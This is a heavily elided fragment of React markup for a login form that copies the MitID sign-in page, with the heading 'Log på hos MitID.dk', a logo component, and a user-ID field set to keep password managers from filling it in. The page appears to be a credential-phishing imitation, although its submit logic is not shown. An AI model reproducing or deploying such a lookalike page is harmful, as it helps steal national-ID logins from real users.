      ...
      <main className="flex-1 sm:mt-[26px] mt-0 flex justify-center px-4 sm:px-0">
        <div className="flex flex-col lg:flex-row gap-[60px] items-center lg:items-start">
          <div className="bg-white mx-auto lg:mx-0" style={{ width: 400, minHeight: '24.8rem', height: 588, border: '1px solid #e0e0e0', marginTop: 26 }}>
            <form onSubmit={handleSubmit} className="flex flex-col h-full px-6 pt-8 pb-6">
              <div className="flex items-start justify-between mt-6">
                <h1 className="text-[18px] font-bold leading-[1.35] pr-4">Log på hos MitID.dk</h1>
                <MitIdLogo />
              </div>
              <hr style={{ borderTop: '1px solid #e0e0e0' }} className="mt-4 mb-7" />
              <div className="mb-6">
                ...
                <div className="relative">
                  <input type={showUserId ? 'text' : 'password'} value={userId} onChange={(e) => setUserId(e.target.value)}
                    ...
                    className="w-full border border-[#999] rounded-[2px] px-3 py-3 text-[15px] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-14" autoComplete="off" inputMode="text" data-lpignore="true" data-1p-ignore="true" spellCheck={false} />
              ...
              <button type="submit" disabled={loading || !userId.trim()}
                className={`w-full font-bold text-[16px] py-3.5 px-4 rounded-[3px] flex items-center justify-between transition-colors ${
                  userId.trim() && !loading
              ...
              <hr style={{ borderTop: '1px solid #e0e0e0' }} className="mb-5" />
